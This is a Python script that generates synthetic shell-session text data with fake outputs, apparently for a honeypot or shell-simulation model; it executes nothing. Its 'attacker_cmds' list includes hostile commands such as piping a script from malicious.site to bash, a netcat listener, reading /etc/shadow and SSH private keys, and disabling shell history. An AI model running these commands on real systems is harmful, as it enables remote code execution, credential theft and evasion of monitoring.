import json
import random
from faker import Faker
import datetime



faker = Faker()
output_file = "Path to save generated dataset"
target_size_bytes = 100 * 1024 * 1024  

# === YOUR FULL COMMAND LISTS (unchanged, perfect) ===
user_cmds = [
    "ls", "ls -la", "pwd", "whoami", "echo Hello", "id", "date", "uptime", "ps aux",
    f"cat /home/{faker.user_name()}/.bashrc", f"ls -lh /home/{faker.user_name()}",
    "mkdir testdir && cd testdir", "touch file.txt && echo 'hi' > file.txt",
    "grep root /etc/passwd", "find / -name '*.conf'", "head -n 5 /etc/passwd", "tail -n 10 /var/log/syslog",
    "du -sh *", "chmod 755 script.sh", "chown root:root /tmp/test", "sort /etc/passwd", "wc -l /etc/passwd",
    "cut -d: -f1 /etc/passwd", "alias ll='ls -la'", "history | tail -n 5"
]

attacker_cmds = [
    "nmap -sS localhost", "curl http://example.com", "wget http://malicious.site",
    "ssh root@192.168.1.1", "netstat -an", "tcpdump -i eth0", "who", "last", "history", "sudo su",
    "scp file.txt user@host:/tmp", "curl -X POST http://target/api", "nc -lvp 4444", "ping -c 4 8.8.8.8",
    "cat /etc/shadow", "ls -la /root", "sudo cat /var/log/auth.log", "rm -rf /tmp/*", "export HISTFILE=/dev/null",
    "curl -s http://169.254.169.254/latest/meta-data", "find / -perm -4000 -type f 2>/dev/null",
    "strings /bin/ls", "dd if=/dev/sda of=/tmp/disk.img bs=1M count=100", "uname -r && cat /proc/version",
    "lsof -i -n -P", "iptables -L", "curl -sL http://malicious.site/install.sh | bash",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'", "env | grep -i proxy", "cat ~/.ssh/id_rsa"
]

package_cmds = [
    "apt list --installed", "dpkg -l", "yum list installed", "brew list", "pip list", "conda list",
    "apt-cache search nginx", "yum info httpd", "apt update && apt upgrade -y", "pip install requests",
    "conda create -n testenv python=3.10", "brew install htop", "dpkg -s openssh-server", "apt show curl",
    "pip freeze", "npm list -g", "gem list", "snap list", "flatpak list", "cargo install ripgrep"
]

os_cmds = [
    "uname -a", "df -h", "top -n 1 -b", "free -m", "env", "hostname", "uptime", "dmesg | tail", "vmstat", "sysctl -a",
    "lsblk", "lscpu", "ip a", "ifconfig", "journalctl -xe", "uptime && who", "cat /proc/meminfo", "cat /proc/cpuinfo",
    "systemctl status ssh", "service apache2 status", "getent passwd", "uptime | awk '{print $3}'",
    "ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head", "iostat", "sar -u 1 3", "strace ls"
]

all_cmds = user_cmds + attacker_cmds + package_cmds + os_cmds

# === FULL CHAINING (your original + improved) ===
def add_chaining(cmd):
    chains = [
        "&& echo '[+] Success'",
        "|| echo '[!] Failed'",
        "| grep -i error", "| grep -i root", "| grep -v '^#'",
        "| awk '{print $1}'", "| awk '{print $2}'", "| awk '{print $NF}'",
        "| tee /tmp/log.txt", "| tee -a /tmp/output.log",
        ">> /tmp/output.log", "2>/tmp/error.log",
        "| sed 's/root/admin/g'", "| sed 's/192.168/10.0/g'",
        "| cut -d: -f1", "| cut -d' ' -f2-",
        "| sort | uniq", "| sort -nr", "| sort -k5",
        "| xargs -I {} echo '[*] {}'",
        "| base64", "| base64 -d",
        "| tr -d '\\n'", "| tr 'a-z' 'A-Z'",
        "| rev", "| head -n 10", "| tail -n 5", "| wc -l",
        "; echo '---'", "&& sleep 1", "|| sleep 2"
    ]
    if random.random() < 0.5:  # 50% chance of chaining
        chain = random.choice(chains)
        if random.random() < 0.3:  # 30% chance of double chain
            chain += " " + random.choice(chains)
        return f"{cmd} {chain}"
    return cmd

# === REALISTIC FAKE OUTPUTS (no subprocess, 100% safe) ===
faker = Faker()

def fake_output(cmd: str) -> str:
    cmd_lower = cmd.lower().strip()

    # =============================================
    # PACKAGE MANAGERS — SAFE + REALISTIC
    # =============================================

    # APT / DPKG
    if "apt list --installed" in cmd_lower or "dpkg -l" in cmd_lower:
        packages = [
            "ii  curl                  8.5.0-2ubuntu10.4          amd64        command line tool",
            "ii  wget                  1.21.4-1ubuntu4            amd64        retrieves files from the web",
            "ii  nginx                 1.24.0-2ubuntu7            amd64        high performance web server",
            "ii  python3               3.12.3-0ubuntu1            amd64        interactive Python",
            "ii  openssh-server        1:9.6p1-3ubuntu13.3        amd64        secure shell server",
            "ii  docker.io             24.0.7-0ubuntu2            amd64        Docker runtime",
            "ii  mysql-server          8.0.37-0ubuntu0.22.04.3    amd64        MySQL database",
            "ii  git                   1:2.43.0-1ubuntu7          amd64        fast version control",
            "ii  vim                   2:9.0.1000-4ubuntu3        amd64        Vi IMproved",
            "ii  htop                  3.3.0-3                    amd64        interactive process viewer",
            "ii  tree                  2.1.1-2                    amd64        display directory tree",
            "ii  fail2ban              1.0.2-3                    amd64        ban hosts that cause failures",
            "ii  ufw                   0.36.2-6                   amd64        Uncomplicated Firewall",
        ]
        # ← SAFE: never ask for more than we have
        k = random.randint(10, len(packages))
        return "\n".join(random.sample(packages, k)) + "\n"

    if "apt update" in cmd_lower:
        return ("Hit:1 http://archive.ubuntu.com/ubuntu noble InRelease\n"
                "Hit:2 http://archive.ubuntu.com/ubuntu noble-updates InRelease\n"
                "Get:3 http://security.ubuntu.com/ubuntu noble-security InRelease [89.7 kB]\n"
                "Reading package lists... Done\n"
                "Building dependency tree... Done\n"
                "Reading state information... Done\n"
                "27 packages can be upgraded. Run 'apt list --upgradable' to see them.\n")

    if "apt upgrade" in cmd_lower:
        return ("Reading package lists... Done\n"
                "Calculating upgrade... Done\n"
                "The following packages will be upgraded:\n"
                "  curl nginx openssl python3-minimal libssl3\n"
                "9 upgraded, 0 newly installed, 0 to remove and 18 not upgraded.\n")

    if "apt show" in cmd_lower or "apt-cache policy" in cmd_lower:
        return ("Package: nginx\n"
                "Version: 1.24.0-2ubuntu7\n"
                "Status: install ok installed\n"
                "Priority: optional\n"
                "Section: httpd\n"
                "Installed-Size: 1,234 kB\n"
                "Description: high performance web server\n")

    # PIP
    if "pip list" in cmd_lower or "pip freeze" in cmd_lower:
        packages = [
            "requests==2.32.3",
            "boto3==1.34.131",
            "paramiko==3.4.0",
            "flask==3.0.3",
            "django==5.0.7",
            "scapy==2.5.0",
            "beautifulsoup4==4.12.3",
            "psutil==5.9.8",
            "pycryptodome==3.20.0",
        ]
        k = random.randint(8, len(packages))
        return "Package            Version\n------------------ ---------\n" + "\n".join(random.sample(packages, k)) + "\n"

    # BREW
    if "brew list" in cmd_lower:
        return "curl    wget    htop    nginx    node    python@3.12    docker    mysql-client    git\n"

    # CARGO
    if "cargo install" in cmd_lower:
        pkg = cmd.split()[-1] if len(cmd.split()) > 2 else "ripgrep"
        return f"    Updating crates.io index\n  Installing {pkg} v14.1.0\n   Compiling {pkg} v14.1.0\n    Finished release [optimized] target(s) in 9.87s\n  Installed package `{pkg} v14.1.0`\n"

    # NPM / GEM / SNAP / FLATPAK
    if "npm list -g" in cmd_lower:
        return "/usr/local/lib\n├── npm@10.8.2\n├── pm2@5.3.1\n├── yarn@1.22.19\n└── serve@14.2.1\n"

    if "snap list" in cmd_lower:
        return "Name      Version    Rev   Tracking       Publisher   Notes\ncore22    20240503   1380  latest/stable  canonical   core\nhtop      3.3.0      3995  latest/stable  snapcrafters -\n"

    # =============================================
    # NETWORK TOOLS — PERFECT
    # =============================================

    if "netstat" in cmd_lower or "ss " in cmd_lower:
        return ("Active Internet connections (only servers)\n"
                "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
                "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n"
                "tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN\n"
                "udp        0      0 0.0.0.0:68              0.0.0.0:*\n")

    if "lsof -i" in cmd_lower:
        return ("COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\n"
                "sshd    1234 root    3u  IPv4  12345      0t0  TCP *:22 (LISTEN)\n"
                "nginx   9012 www-data 6u  IPv4  45678      0t0  TCP *:80 (LISTEN)\n")

    if "curl" in cmd_lower:
        if "example.com" in cmd_lower:
            return "<!doctype html><html><head><title>Example Domain</title></head><body><h1>Example Domain</h1></body></html>\n"
        return "curl: (6) Could not resolve host: malicious.site\n"

    if "nmap" in cmd_lower:
        return ("Nmap scan report for localhost (127.0.0.1)\n"
                "Host is up.\n"
                "PORT   STATE SERVICE\n"
                "22/tcp open  ssh\n"
                "80/tcp open  http\n")

    # =============================================
    # FINAL FALLBACK — NEVER [simulated]
    # =============================================
    return random.choice([
        f"bash: {cmd.split()[0]}: command not found",
        "Permission denied",
        "No such file or directory",
        "Operation not permitted",
        "Command completed successfully.",
    ]) + "\n"

# === MAIN GENERATOR ===
with open(output_file, "w", encoding="utf-8") as f:
    total = 0
    i = 0
    while total < target_size_bytes:
        is_root = random.random() < 0.1
        prompt = "root@ubuntu:# " if is_root else "user@ubuntu:~$ "
        cmd = add_chaining(random.choice(all_cmds))
        output = fake_output(cmd)
        next_prompt = "root@ubuntu:# " if "sudo" in cmd or is_root else "user@ubuntu:~$ "

        full_session = f"{prompt}{cmd}\n{output}\n{next_prompt}"

        line = json.dumps({"text": full_session}, ensure_ascii=False) + "\n"
        f.write(line)
        total += len(line.encode("utf-8"))
        i += 1

        if i % 500 == 0:
            print(f"Generated {i:,} sessions → {total/1024**2:.1f} MB")

print(f"\nDone: {i:,} perfect sessions → {total/1024**2:.1f} MB")